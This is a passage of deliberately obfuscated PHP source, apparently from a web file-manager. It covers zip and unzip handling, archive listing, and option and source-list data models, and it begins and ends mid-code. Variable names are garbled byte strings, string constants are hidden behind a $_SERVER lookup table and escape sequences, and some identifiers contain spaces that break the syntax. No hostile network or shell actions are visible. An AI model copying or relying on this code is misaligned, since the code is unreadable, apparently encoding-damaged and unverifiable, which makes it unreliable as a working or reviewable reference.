$–µ£ì¬ú; } private static function iconvSystem($æ›Í—ğ¶) { return self::local()->iconvSystem($æ›Í—ğ¶); } private static function iconvApp($È˜ì´£×) { return self::local()->iconvApp($È˜ì´£×); } public static function zip($«¯»·Óö, $†«•×Ï = "\x7a\x69\160", $İœéĞ†È = '', $íÒ¹­ö¨ = REPEAT_RENAME) { $„öÌŸé˜ =& $_SERVER[¹àö™Ç¾]; $ŒŞ½Ö§Ì = self::init($«¯»·Óö[0][$„öÌŸé˜[88]]); $ÚéùÚâ† = self::info($«¯»·Óö[0][$„öÌŸé˜[88]]); $Ø”¸˜è‘ = !1; if (!$İœéĞ†È && $ŒŞ½Ö§Ì->getType() == $„öÌŸé˜[117]) { $¦çâù = self::zipFileList($«¯»·Óö); } else { $Ø”¸˜è‘ = $İœéĞ†È ? $İœéĞ†È : TEMP_FILES . $„öÌŸé˜[1167] . time() . rand_string(8) . $„öÌŸé˜[18]; mk_dir($Ø”¸˜è‘); $¦çâù = self::zipFileList($«¯»·Óö, $Ø”¸˜è‘); } $İš¼Í = $ÚéùÚâ†[$„öÌŸé˜[42]]; if (count($¦çâù) > 1) { $ŸÃô’ñô = IO::info(IO::pathFather($ÚéùÚâ†[$„öÌŸé˜[88]])); $İš¼Í = $ŸÃô’ñô[$„öÌŸé˜[42]]; } $Á±ğÑÃ = $Ø”¸˜è‘; if (!$Á±ğÑÃ) { $Á±ğÑÃ = get_path_father($ÚéùÚâ†[$„öÌŸé˜[88]]); if (!$İœéĞ†È && $ŒŞ½Ö§Ì->getType() == $„öÌŸé˜[117]) { $Á±ğÑÃ = get_path_father($ŒŞ½Ö§Ì->path); } $áÅĞÌ©Ñ = IO::info($Á±ğÑÃ); if (!$áÅĞÌ©Ñ[$„öÌŸé˜[205]]) { show_json(LNG($„öÌŸé˜[1168]), !1); } } $‹šÛÈÖª = $Á±ğÑÃ . $İš¼Í . $„öÌŸé˜[20] . $†«•×Ï; $‹šÛÈÖª = get_filename_auto($‹šÛÈÖª, $„öÌŸé˜[22], $íÒ¹­ö¨); $ƒÑÊÑ¢î = self::iconvSystem($‹šÛÈÖª); foreach ($¦çâù as $Ø·ˆÕ©é => $ÜÇ¹òÍŞ) { $¦çâù[$Ø·ˆÕ©é] = self::iconvSystem($ÜÇ¹òÍŞ); } KodArchive::create($ƒÑÊÑ¢î, $¦çâù); if (!IO::exist($‹šÛÈÖª)) { if ($Ø”¸˜è‘) { del_dir($Ø”¸˜è‘); } show_json(LNG($„öÌŸé˜[1169]), !1); } if ($İœéĞ†È || !$Ø”¸˜è‘) { if ($Ø”¸˜è‘ && strstr($Ø”¸˜è‘, TEMP_FILES)) { $Øé©éÇ = $¦çâù = array(); recursion_dir($Á±ğÑÃ, $Øé©éÇ, $¦çâù, 0); foreach ($Øé©éÇ as $¬Şû•¾Ò) { del_dir($¬Şû•¾Ò); } foreach ($¦çâù as $ÅµˆÀ‰) { if ($ÅµˆÀ‰ == $ƒÑÊÑ¢î) { continue; } del_file($ÅµˆÀ‰); } } return $‹šÛÈÖª; } $Ú»÷Éùİ = self::pathFather($ÚéùÚâ†[$„öÌŸé˜[88]]); $õ©â¼Ûí = self::move($‹šÛÈÖª, $Ú»÷Éùİ, $íÒ¹­ö¨); if (!$õ©â¼Ûí) { del_dir($Ø”¸˜è‘); show_json(LNG($„öÌŸé˜[1169]), !1); } del_dir($Ø”¸˜è‘); return $õ©â¼Ûí; } public static function unzip($©üœ£¹, $°ö…Øî¨ = "\162\x65\x70\x6c\x61\143\145") { $´¿‘Ë—‹ =& $_SERVER[¹àö™Ç¾]; $éŞùÑæà = $©üœ£¹[$´¿‘Ë—‹[88]]; $Ï¾‡§ÇÇ = $©üœ£¹[$´¿‘Ë—‹[1170]]; if (!($­¢àõÊÁ = parent::info($éŞùÑæà))) { show_json(LNG($´¿‘Ë—‹[1171]), !1); } if (!($ÆåÃØÕ = parent::infoFull($Ï¾‡§ÇÇ))) { $Ï¾‡§ÇÇ = parent::mkdir($Ï¾‡§ÇÇ); $ÆåÃØÕ = array($´¿‘Ë—‹[88] => $Ï¾‡§ÇÇ); } else { if (isset($ÆåÃØÕ[$´¿‘Ë—‹[403]]) && trim($ÆåÃØÕ[$´¿‘Ë—‹[88]], $´¿‘Ë—‹[18]) != trim($Ï¾‡§ÇÇ, $´¿‘Ë—‹[18])) { $³¸ç¥è² = KodIO::make($ÆåÃØÕ[$´¿‘Ë—‹[498]]); $­°ûÁ ° = parent::fileNameAuto($³¸ç¥è², $ÆåÃØÕ[$´¿‘Ë—‹[42]], REPEAT_RENAME_FOLDER, !0); $Ï¾‡§ÇÇ = parent::mkdir($³¸ç¥è² . $­°ûÁ °); $ÆåÃØÕ = array($´¿‘Ë—‹[88] => $Ï¾‡§ÇÇ); } } $Ï¾‡§ÇÇ = $ÆåÃØÕ[$´¿‘Ë—‹[88]]; $ÅÇ®Ç€ü = self::tmpFileName($­¢àõÊÁ); $ÒïÃ„ª† = TEMP_FILES . $ÅÇ®Ç€ü; del_dir($ÒïÃ„ª†); mk_dir($ÒïÃ„ª†); $µë¯Ã®í = self::fileExt($­¢àõÊÁ); $İÙ¤øÑ… = $ÒïÃ„ª† . $´¿‘Ë—‹[20] . $µë¯Ã®í; if (!@file_exists(self::iconvSystem($İÙ¤øÑ…))) { $ÔÊ«™­¿ = self::localFilePath($éŞùÑæà, $µë¯Ã®í); $İÙ¤øÑ… = $ÔÊ«™­¿ ? $ÔÊ«™­¿ : parent::download($éŞùÑæà, $İÙ¤øÑ…); } $İÙ¤øÑ… = self::iconvSystem($İÙ¤øÑ…); $‚¶©äÜÑ = isset($©üœ£¹[$´¿‘Ë—‹[1172]]) ? $©üœ£¹[$´¿‘Ë—‹[1172]] : $´¿‘Ë—‹[1173]; $…šáò½Ç = KodArchive::extract($İÙ¤øÑ…, $ÒïÃ„ª† . $´¿‘Ë—‹[18], $‚¶©äÜÑ); self::archiveExt(); if (!$…šáò½Ç[$´¿‘Ë—‹[1174]]) { show_json($´¿‘Ë—‹[1175] . $…šáò½Ç[$´¿‘Ë—‹[1176]], !1); } Hook::trigger($´¿‘Ë—‹[1177], $ÒïÃ„ª†); recursion_dir($ÒïÃ„ª†, $Ÿ¤ÎÈ²Æ, $ÛıŸ…§, 0); $Áíß¿£å = array_merge($Ÿ¤ÎÈ²Æ, $ÛıŸ…§); foreach ($Áíß¿£å as $˜–­¦‘) { $˜–­¦‘ = self::iconvApp($˜–­¦‘); self::move($˜–­¦‘, $Ï¾‡§ÇÇ, $°ö…Øî¨); } del_dir($ÒïÃ„ª†); if (!$ÔÊ«™­¿) { del_file($İÙ¤øÑ…); } return !0; } public static function unzipList($ü†À­ÕŞ) { $Âä«¨öë =& $_SERVER[¹àö™Ç¾]; $ï³Ñî¹ = $ü†À­ÕŞ[$Âä«¨öë[88]]; $ùå–™ğ = isset($ü†À­ÕŞ[$Âä«¨öë[1178]]) ? $ü†À­ÕŞ[$Âä«¨öë[1178]] : -1; $±¡ˆœÈö = 50000; if (request_url_safe($ï³Ñî¹)) { $ì»÷Šïå = parse_url_query($ï³Ñî¹); if (!isset($ì»÷Šïå[$Âä«¨öë[88]])) { show_json($Âä«¨öë[1179], !1); } } $£é¯Ï˜½ = isset($ì»÷Šïå) ? $ì»÷Šïå[$Âä«¨öë[88]] : $ï³Ñî¹; $Ş¸ÍÑº– = self::info($£é¯Ï˜½); $üñåéªŒ = self::fileExt($Ş¸ÍÑº–); $•Õóë§¬ = self::tmpFileName($Ş¸ÍÑº–); if (isset($ì»÷Šïå)) { $š­Š„½Ò = array($ì»÷Šïå[$Âä«¨öë[88]], $ì»÷Šïå[$Âä«¨öë[1178]], $ì»÷Šïå[$Âä«¨öë[42]]); $Äª”öÛ = md5(implode($Âä«¨öë[21], $š­Š„½Ò)) . $Âä«¨öë[20] . get_path_ext($ì»÷Šïå[$Âä«¨öë[42]]); } else { $š­Š„½Ò = array($Ş¸ÍÑº–[$Âä«¨öë[42]], $Ş¸ÍÑº–[$Âä«¨öë[88]], $Ş¸ÍÑº–[$Âä«¨öë[90]]); $Äª”öÛ = md5(implode($Âä«¨öë[21], $š­Š„½Ò)) . $Âä«¨öë[20] . $üñåéªŒ; } if ($ùå–™ğ == -1) { $Ñ¿Äçç = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\x69\x65\x77\x2f{$•Õóë§¬}\57{$Äª”öÛ}\56\154\x6f\x67"; $ê÷¾ıÒ¼ = self::infoFull($Ñ¿Äçç); if ($ê÷¾ıÒ¼) { $Ñ¿Äçç = $ê÷¾ıÒ¼[$Âä«¨öë[88]]; $ÔÑŠù§Ø = self::getContent($Ñ¿Äçç); if ($ÔÑŠù§Ø) { $ˆöÙŞìå = json_decode($ÔÑŠù§Ø, !0); $ˆöÙŞìå = is_array($ˆöÙŞìå) ? $ˆöÙŞìå : array(); if (count($ˆöÙŞìå) >= $±¡ˆœÈö) { show_json(sprintf(LNG($Âä«¨öë[1180]), count($ˆöÙŞìå)), !1); } return $ˆöÙŞìå; } } else { $Ñ¿Äçç = self::mkfile($Ñ¿Äçç); } } $íŒ¨®ì = TEMP_FILES . $•Õóë§¬; if (!is_dir($íŒ¨®ì)) { mk_dir($íŒ¨®ì); } $¬›çƒÇÅ = $íŒ¨®ì . $Âä«¨öë[18] . $Äª”öÛ; if (!@file_exists(self::iconvSystem($¬›çƒÇÅ))) { if (isset($ì»÷Šïå)) { url_request($ï³Ñî¹, $Âä«¨öë[1181], $¬›çƒÇÅ); } else { $¡„Ò˜Ëë = self::localFilePath($ï³Ñî¹, $üñåéªŒ); $¬›çƒÇÅ = $¡„Ò˜Ëë ? $¡„Ò˜Ëë : self::download($ï³Ñî¹, $¬›çƒÇÅ); } } $¬›çƒÇÅ = self::iconvSystem($¬›çƒÇÅ); if ($ùå–™ğ >= 0) { $ìÏùôâ = isset($ü†À­ÕŞ[$Âä«¨öë[1182]]) ? $ü†À­ÕŞ[$Âä«¨öë[1182]] : !1; $œØÆ¶Í² = isset($ü†À­ÕŞ[$Âä«¨öë[42]]) ? $ü†À­ÕŞ[$Âä«¨öë[42]] : $Âä«¨öë[22]; KodArchive::filePreview($¬›çƒÇÅ, $ùå–™ğ, $ìÏùôâ, $œØÆ¶Í²); self::archiveExt(); die; } $åŒÃ¦˜ = KodArchive::listContent($¬›çƒÇÅ); self::archiveExt(); del_dir($íŒ¨®ì); if (!$åŒÃ¦˜[$Âä«¨öë[1174]]) { show_json($åŒÃ¦˜[$Âä«¨öë[1176]], !1); } $ˆöÙŞìå = json_encode($åŒÃ¦˜[$Âä«¨öë[1176]]); self::setContent($Ñ¿Äçç, $ˆöÙŞìå); if (count($åŒÃ¦˜[$Âä«¨öë[1176]]) >= $±¡ˆœÈö) { show_json(sprintf(LNG($Âä«¨öë[1180]), count($åŒÃ¦˜[$Âä«¨öë[1176]])), !1); } return $åŒÃ¦˜[$Âä«¨öë[1176]]; } private static function fileExt($åµæå¯‚) { $¹™€Ÿë£ =& $_SERVER[¹àö™Ç¾]; $¨Õˆ‘ËÙ = $åµæå¯‚[$¹™€Ÿë£[177]]; if ($¨Õˆ‘ËÙ == $¹™€Ÿë£[1183]) { $¾şû¬Ùè = $¹™€Ÿë£[1184]; if (substr($åµæå¯‚[$¹™€Ÿë£[42]], -strlen($¾şû¬Ùè)) == $¾şû¬Ùè) { $¨Õˆ‘ËÙ = $¹™€Ÿë£[1185]; } } self::archiveExt($¨Õˆ‘ËÙ); return $¨Õˆ‘ËÙ; } private static function zipFileList($ƒ„‚¨Í¹, $—æŒĞåğ = false) { $²î¥ı› =& $_SERVER[¹àö™Ç¾]; $·­—İû = array(); foreach ($ƒ„‚¨Í¹ as $…ÔÀ’ŠŞ) { $·ôƒ±• = $…ÔÀ’ŠŞ[$²î¥ı›[88]]; if ($—æŒĞåğ) { $·ôƒ±• = self::copy($…ÔÀ’ŠŞ[$²î¥ı›[88]], $—æŒĞåğ, $²î¥ı›[810]); } else { $ğÇåÕºş = self::init($…ÔÀ’ŠŞ[$²î¥ı›[88]]); if ($ğÇåÕºş->getType() == $²î¥ı›[117]) { $·ôƒ±• = $ğÇåÕºş->path; } } if ($·ôƒ±• && self::local()->exist($·ôƒ±•)) { $·­—İû[$…ÔÀ’ŠŞ[$²î¥ı›[88]]] = $·ôƒ±•; } } if (!empty($·­—İû)) { return array_values($·­—İû); } show_json(LNG($²î¥ı›[1149]), !1); } public static function tmpFileName($õûÚùÍ) { $Êº‚½Ÿ˜ =& $_SERVER[¹àö™Ç¾]; $ğ’¥•Ğ— = array($õûÚùÍ[$Êº‚½Ÿ˜[42]], $õûÚùÍ[$Êº‚½Ÿ˜[88]], $õûÚùÍ[$Êº‚½Ÿ˜[90]], $õûÚùÍ[$Êº‚½Ÿ˜[521]]); return md5(implode($Êº‚½Ÿ˜[21], $ğ’¥•Ğ—)); } private static function localFilePath($®¢Ò—™², $Î‚ÊÊ ®) { $üÒÚÀŸÕ =& $_SERVER[¹àö™Ç¾]; if ($Î‚ÊÊ ® == $üÒÚÀŸÕ[1186] && strtoupper(substr(PHP_OS, 0, 3)) == $üÒÚÀŸÕ[1187]) { return !1; } $û “¯Šç = KodIO::parse($®¢Ò—™²); if ($û “¯Šç[$üÒÚÀŸÕ[43]] == KodIO::KOD_SOURCE) { $–Óñ´Ãæ = Model($üÒÚÀŸÕ[817])->fileInfoGet(KodIO::sourceID($®¢Ò—™²)); if (!$–Óñ´Ãæ[$üÒÚÀŸÕ[88]]) { show_json($üÒÚÀŸÕ[1188], !1); } $®¢Ò—™² = $–Óñ´Ãæ[$üÒÚÀŸÕ[88]]; } $œ’«Ó»ö = self::init($®¢Ò—™²); if ($œ’«Ó»ö->pathParse[$üÒÚÀŸÕ[1136]]) { $®¢Ò—™² = $œ’«Ó»ö->pathParse[$üÒÚÀŸÕ[1136]]; $œ’«Ó»ö = self::init($®¢Ò—™²); } $÷ñÎãñ­ = $œ’«Ó»ö->getType(); if ($÷ñÎãñ­ == $üÒÚÀŸÕ[117] || $÷ñÎãñ­ == $üÒÚÀŸÕ[1189]) { if (!$œ’«Ó»ö->exist($œ’«Ó»ö->path)) { show_json(LNG($üÒÚÀŸÕ[116]), !1); } return $œ’«Ó»ö->path; } return !1; } private static function archiveExt($¡êâñÀå = '') { $GLOBALS[$_SERVER[¹àö™Ç¾][1190]] = $¡êâñÀå; } } goto BŞ«ïÄÜ¥Ë; c°˜†ì¸: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\x6d\x4f\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($ğ¾İÒ° = false, $¿Ğ”—ğ = "\155\157\144\x69\146\x79\x54\151\155\145", $š´µèŠ® = false) { $ÈÖÚ¬ïù = Model($this->modelType)->get(!1, $this->optionType, !0); $ ÜÔàÆ— = array_values($ÈÖÚ¬ïù); if ($ ÜÔàÆ— && $ ÜÔàÆ—[0] && !is_array($ ÜÔàÆ—[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÈÖÚ¬ïù = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÈÖÚ¬ïù) { return $ğ¾İÒ° ? null : array(); } if (!$ğ¾İÒ°) { $ÈÖÚ¬ïù = array_filter(array_values($ÈÖÚ¬ïù)); return array_sort_by($ÈÖÚ¬ïù, $¿Ğ”—ğ, $š´µèŠ®); } return $ÈÖÚ¬ïù[$_SERVER[¹àö™Ç¾][398] . $ğ¾İÒ°]; } public function insert($åªæ» ù) { $»´¸·şÈ =& $_SERVER[¹àö™Ç¾]; $åªæ» ù = array_field_key($åªæ» ù, $this->field); $¼è˜ú´ñ = Model($this->modelType)->get($»´¸·şÈ[399], $this->optionType . $»´¸·şÈ[400]); $¼è˜ú´ñ = $¼è˜ú´ñ ? $¼è˜ú´ñ : 0; $åªæ» ù[$»´¸·şÈ[401]] = ++$¼è˜ú´ñ; $åªæ» ù[$»´¸·şÈ[203]] = time(); $åªæ» ù[$»´¸·şÈ[96]] = time(); Model($this->modelType)->set($»´¸·şÈ[399], $¼è˜ú´ñ, $this->optionType . $»´¸·şÈ[400]); Model($this->modelType)->set($»´¸·şÈ[398] . $¼è˜ú´ñ, $åªæ» ù, $this->optionType); return $¼è˜ú´ñ; } public function update($â®İ±‘Å, $ó¹î«æ) { $ÑõÑã»Ï =& $_SERVER[¹àö™Ç¾]; $ó¹î«æ = array_field_key($ó¹î«æ, $this->field); $¼×©õÜ  = $this->listData($â®İ±‘Å); if (!$¼×©õÜ  || !$â®İ±‘Å) { return !1; } $ó¹î«æ = array_merge($¼×©õÜ , $ó¹î«æ); $ó¹î«æ[$ÑõÑã»Ï[96]] = time(); return Model($this->modelType)->set($ÑõÑã»Ï[398] . $â®İ±‘Å, $ó¹î«æ, $this->optionType); } public function remove($¶£¦Ášâ) { if (!$¶£¦Ášâ) { return !1; } return Model($this->modelType)->remove($_SERVER[¹àö™Ç¾][398] . $¶£¦Ášâ, $this->optionType); } public function clear() { $Ì›åÀ©­ =& $_SERVER[¹àö™Ç¾]; Model($this->modelType)->remove($Ì›åÀ©­[399], $this->optionType . $Ì›åÀ©­[400]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÂŒ·—ÈÑ, $Ú•ŸŠ) { if (!$Ú•ŸŠ) { return !1; } $‡Îµ‹‹ = $this->listData(); $‡Îµ‹‹ = array_to_keyvalue($‡Îµ‹‹, $ÂŒ·—ÈÑ); return isset($‡Îµ‹‹[$Ú•ŸŠ]) ? $‡Îµ‹‹[$Ú•ŸŠ] : !1; } public function findByName($²¾Îãò¢) { return $this->findByKey($_SERVER[¹àö™Ç¾][42], $²¾Îãò¢); } protected function resetData($ŠùË·®Ó) { $ ­¹™¦º =& $_SERVER[¹àö™Ç¾]; $ŠùË·®Ó = is_array($ŠùË·®Ó) ? $ŠùË·®Ó : array(); $ôÃº„İı = array(); for ($ƒ›ÓÛ™¹ = 0; $ƒ›ÓÛ™¹ < count($ŠùË·®Ó); $ƒ›ÓÛ™¹++) { $ôÃº„İı[$ ­¹™¦º[398] . $ŠùË·®Ó[$ƒ›ÓÛ™¹][$ ­¹™¦º[401]]] = $ŠùË·®Ó[$ƒ›ÓÛ™¹]; } return Model($this->modelType)->set($ôÃº„İı, !1, $this->optionType); } private function getAutoName($ˆ²ÁØåœ) { $÷¿Òğß´ = array_to_keyvalue($this->listData(), $_SERVER[¹àö™Ç¾][42]); if (!$÷¿Òğß´ || !isset($÷¿Òğß´[$ˆ²ÁØåœ])) { return $ˆ²ÁØåœ; } for ($âåö‹ß = 1; $âåö‹ß < count($÷¿Òğß´); $âåö‹ß++) { $ú÷ÊÑ”Ò = $ˆ²ÁØåœ . "\x28{$âåö‹ß}\x29"; if (!isset($÷¿Òğß´[$ú÷ÊÑ”Ò])) { return $ú÷ÊÑ”Ò; } } return $ú÷ÊÑ”Ò; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÆúĞ˜ñË = false, $ÀöÅÑÖè = '', $¸¥€«¤ = false) { $Ãßø«Ÿ¸ =& $_SERVER[¹àö™Ç¾]; $Š·ãªùâ = $this->cacheGet($ÀöÅÑÖè); $ô¨°”å = $this->optionDefault($ÀöÅÑÖè); $ô¨°”å = is_array($ô¨°”å) ? $ô¨°”å : array(); if (is_array($Š·ãªùâ)) { $Š·ãªùâ = array_merge($ô¨°”å, $Š·ãªùâ); return $ÆúĞ˜ñË ? isset($Š·ãªùâ[$ÆúĞ˜ñË]) ? $Š·ãªùâ[$ÆúĞ˜ñË] : null : $Š·ãªùâ; } $Á¤ŞîåÌ = $this->filterWhere(array($Ãßø«Ÿ¸[43] => $ÀöÅÑÖè)); $Š·ãªùâ = $this->where($Á¤ŞîåÌ)->select(); $Š·ãªùâ = array_to_keyvalue($Š·ãªùâ, $Ãßø«Ÿ¸[105], $Ãßø«Ÿ¸[378]); foreach ($Š·ãªùâ as $ª üşÄè => $ØßÃÆà®) { if ($¸¥€«¤ || in_array($ª üşÄè, $this->jsonField)) { $Š·ãªùâ[$ª üşÄè] = json_decode($ØßÃÆà®, !0); } } $this->cacheSet($ÀöÅÑÖè, $Š·ãªùâ); $Š·ãªùâ = array_merge($ô¨°”å, $Š·ãªùâ); return $ÆúĞ˜ñË ? $Š·ãªùâ[$ÆúĞ˜ñË] : $Š·ãªùâ; } public function set($«øĞ÷Ÿñ, $ïÁ’áø¨ = false, $ËŠâÚ–ó = '') { $ÜôØ€± =& $_SERVER[¹àö™Ç¾]; $this->cacheRemove($ËŠâÚ–ó); $Éëô½ú£ = array(); $ùµ«™‹ = is_array($«øĞ÷Ÿñ) ? $«øĞ÷Ÿñ : array($«øĞ÷Ÿñ => $ïÁ’áø¨); foreach ($ùµ«™‹ as $„¢›«ŠÄ => $òÈ±É®º) { if (is_array($òÈ±É®º)) { $òÈ±É®º = json_encode_force($òÈ±É®º); } $this->checkLength($òÈ±É®º, !1, $this->tableName . $ÜôØ€±[4] . $«øĞ÷Ÿñ); $òÈ±É®º = self::textEncode($òÈ±É®º); $ùµ«™‹ = array($ÜôØ€±[43] => $ËŠâÚ–ó, $ÜôØ€±[105] => $„¢›«ŠÄ, $ÜôØ€±[378] => $òÈ±É®º); $Éëô½ú£[] = $this->filterWhere($ùµ«™‹); } if (!$Éëô½ú£) { return !0; } return $this->addAll($Éëô½ú£, array(), !0); } protected function optionDefault($ÙÍºß† = '') { return !1; } public function setDeep($™Ú€õ¯â, $º‘ªñ² = false, $Ô²²á¾ = '') { $¢½‘Ñó = explode($_SERVER[¹àö™Ç¾][20], $™Ú€õ¯â); $§óñˆ© = $this->get(); array_set_value($§óñˆ©, $™Ú€õ¯â, $º‘ªñ²); $this->set($¢½‘Ñó[0], $§óñˆ©[$¢½‘Ñó[0]], $Ô²²á¾); } public function remove($ªË™ÄÍ§, $ÛÅâş½ = '') { $¬ãœ¬¹ =& $_SERVER[¹àö™Ç¾]; $this->cacheRemove($ÛÅâş½); $‘ŞıˆÂ = $this->filterWhere(array($¬ãœ¬¹[105] => $ªË™ÄÍ§, $¬ãœ¬¹[43] => $ÛÅâş½)); if (is_null($ªË™ÄÍ§)) { unset($‘ŞıˆÂ[$¬ãœ¬¹[105]]); } return $this->where($‘ŞıˆÂ)->delete(); } public function cacheSet($‰“Ø÷¬•, $¯š ûº = false) { return Cache::set($this->cacheKey($‰“Ø÷¬•), $¯š ûº); } public function cacheGet($íŒÊŒ˜®) { return Cache::get($this->cacheKey($íŒÊŒ˜®)); } public function cacheRemove($ºóôõ‹) { return Cache::remove($this->cacheKey($ºóôõ‹)); } protected function filterWhere($õ ò¥Óø) { return $õ ò¥Óø; } protected function cacheKey($ú›ÏğÎğ) { return $ú›ÏğÎğ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\145"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\155\x65" => "\x69\157\x5f\163\157\x75\162\x63\145\137\x6d\x65\164\141", "\x6d\145\164\141\x46\x69\x65\154\x64" => "\163\157\x75\x72\x63\145\111\104"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\151\155\145", "\164\x69\155\145", "\x69\x6e\x73\x65\x72\x74", "\x66\x75\156\x63\164\151\157\156"), array("\143\x72\x65\141\x74\145\124\x69\155\145", "\164\x69\155\145", "\151\156\x73\145\162\x74", "\x66\x75\156\x63\x74\151\157\x6e"), array("\x76\151\x65\167\x54\x69\x6d\x65", "\164\151\x6d\145", "\151\x6e\163\145\162\x74", "\x66\x75\156\x63\x74\x69\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($æ€Ñêè¢) { return $this->listSource(array($_SERVER[¹àö™Ç¾][402] => $æ€Ñêè¢)); } public function typeName($Û€Ÿ€›) { static $»ÛÁµ‡‘ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\x70"); return $»ÛÁµ‡‘[$Û€Ÿ€› . $_SERVER[¹àö™Ç¾][22]]; } public function sourceListInfo($¢¼›–, $ƒ‘š˜¥ = false) { $£ú¹®¡Õ =& $_SERVER[¹àö™Ç¾]; $¢¼›– = $¢¼›– ? $¢¼›– : array(); $¢¼›– = array_filter(array_unique($¢¼›–)); if (!$¢¼›–) { return array(); } $°›ÆÈŒ¾ = $this->where(array($£ú¹®¡Õ[403] => array($£ú¹®¡Õ[17], $¢¼›–)))->select(); $this->_listDataApply($°›ÆÈŒ¾, $ƒ‘š˜¥); return array_to_keyvalue($°›ÆÈŒ¾, $£ú¹®¡Õ[403]); } public function pathInfoFilter(&$£ùÑ×¾³) { $Û´òƒ£º =& $_SERVER[¹àö™Ç¾]; static $À¼«ºšÜ = false; static $ı©•ˆ¿Ë = false; static $ØÄ¥½¸Œ = false; if (!$À¼«ºšÜ) { $Ì¸„æ = $Û´òƒ£º[404]; $Ì¸„æ .= $Û´òƒ£º[405]; $Ì¸„æ .= $Û´òƒ£º[406]; $õóóÈÕ¶ = $Û´òƒ£º[407]; $ûòîä…ƒ = explode($Û´òƒ£º[60], $õóóÈÕ¶); $À¼«ºšÜ = explode($Û´òƒ£º[60], $Ì¸„æ); $ı©•ˆ¿Ë = array(); foreach ($À¼«ºšÜ as $øá¿‰ÆÎ) { if (in_array($øá¿‰ÆÎ, $ûòîä…ƒ)) { continue; } $ı©•ˆ¿Ë[] = $øá¿‰ÆÎ; } $ØÄ¥½¸Œ = explode($Û´òƒ£º[60], $Û´òƒ£º[408]); } foreach ($ØÄ¥½¸Œ as $ÜôÑ®Á) { if (isset($£ùÑ×¾³[$ÜôÑ®Á])) { $£ùÑ×¾³[$ÜôÑ®Á] = intval($£ùÑ×¾³[$ÜôÑ®Á]); } } $£ùÑ×¾³[$Û´òƒ£º[88]] = $Û´òƒ£º[409] . $£ùÑ×¾³[$Û´òƒ£º[403]] . $Û´òƒ£º[410]; $£ùÑ×¾³[$Û´òƒ£º[43]] = $£ùÑ×¾³[$Û´òƒ£º[411]] == 1 ? $Û´òƒ£º[89] : $Û´òƒ£º[202]; $£ùÑ×¾³[$Û´òƒ£º[412]] = $this->typeName($£ùÑ×¾³[$Û´òƒ£º[412]]); if ($£ùÑ×¾³[$Û´òƒ£º[411]] != 1) { $£ùÑ×¾³[$Û´òƒ£º[177]] = $£ùÑ×¾³[$Û´òƒ£º[413]]; unset($£ùÑ×¾³[$Û´òƒ£º[413]]); } $šÛÄü‚ = $À¼«ºšÜ; if (isset($£ùÑ×¾³[$Û´òƒ£º[414]]) && $£ùÑ×¾³[$Û´òƒ£º[414]][$Û´òƒ£º[415]] == -1) { $šÛÄü‚ = $ı©•ˆ¿Ë; } $£ùÑ×¾³ = array_field_key($£ùÑ×¾³, $šÛÄü‚); return $£ùÑ×¾³; } public function listUserFav() { $İ…ªÅğ =& $_SERVER[¹àö™Ç¾]; $¹Ö¬¸Ş£ = Model($İ…ªÅğ[416])->listData(); $ô¹ÅÏµô = array_filter_by_field($¹Ö¬¸Ş£, $İ…ªÅğ[43], $İ…ªÅğ[417]); $ô¹ÅÏµô = array_to_keyvalue($ô¹ÅÏµô, $İ…ªÅğ[22], $İ…ªÅğ[88]); if ($ô¹ÅÏµô) { $şÄ‰Ùæô = $this->listSource(array($İ…ªÅğ[418] => array($İ…ªÅğ[419], $ô¹ÅÏµô))); } $şÄ‰Ùæô = array_to_keyvalue($şÄ‰Ùæô[$İ…ªÅğ[373]], $İ…ªÅğ[403]); foreach ($¹Ö¬¸Ş£ as &$ûĞ¦«’) { $ûĞ¦«’ = array($İ…ªÅğ[420] => $ûĞ¦«’[$İ…ªÅğ[401]], $İ…ªÅğ[421] => $ûĞ¦«’[$İ…ªÅğ[42]], $İ…ªÅğ[422] => $ûĞ¦«’[$İ…ªÅğ[88]], $İ…ªÅğ[423] => $ûĞ¦«’[$İ…ªÅğ[43]], $İ…ªÅğ[424] => $ûĞ¦«’[$İ…ªÅğ[203]], $İ…ªÅğ[425] => $ûĞ¦«’[$İ…ªÅğ[96]]); if ($ûĞ¦«’[$İ…ªÅğ[43]] == $İ…ªÅğ[417] && $şÄ‰Ùæô[$ûĞ¦«’[$İ…ªÅğ[88]]]) { $ûĞ¦«’[$İ…ªÅğ[97]] = $şÄ‰Ùæô[$ûĞ¦«’[$İ…ªÅğ[88]]]; } } unset($ûĞ¦«’); return $¹Ö¬¸Ş£; } public function listUserTag($ø¾û ß¸) { $öŒÆ©öñ =& $_SERVER[¹àö™Ç¾]; if ($ø¾û ß¸ && !is_array($ø¾û ß¸)) { $ø¾û ß¸ = array($ø¾û ß¸); } $¾â‚éÙŒ = Model($öŒÆ©öñ[426])->listData(); $øàÖ” = array(); foreach ($¾â‚éÙŒ as $—£±İŞ) { $¾’Š‚¦Ã = $—£±İŞ[$öŒÆ©öñ[88]]; if (!$¾’Š‚¦Ã) { continue; } if (!isset($øàÖ”[$¾’Š‚¦Ã])) { $øàÖ”[$¾’Š‚¦Ã] = array(); } $øàÖ”[$¾’Š‚¦Ã][] = $—£±İŞ[$öŒÆ©öñ[427]]; } $ğó²Ù‹ = array(); foreach ($øàÖ” as $ÔæİÄ°å => $«ŠÁãì) { $ûœşŸŞÄ = !0; if (!$ø¾û ß¸) { $ğó²Ù‹[] = $ÔæİÄ°å; continue; } foreach ($ø¾û ß¸ as $Â’à¿íø) { if (!in_array($Â’à¿íø, $«ŠÁãì)) { $ûœşŸŞÄ = !1; break; } } if ($ûœşŸŞÄ) { 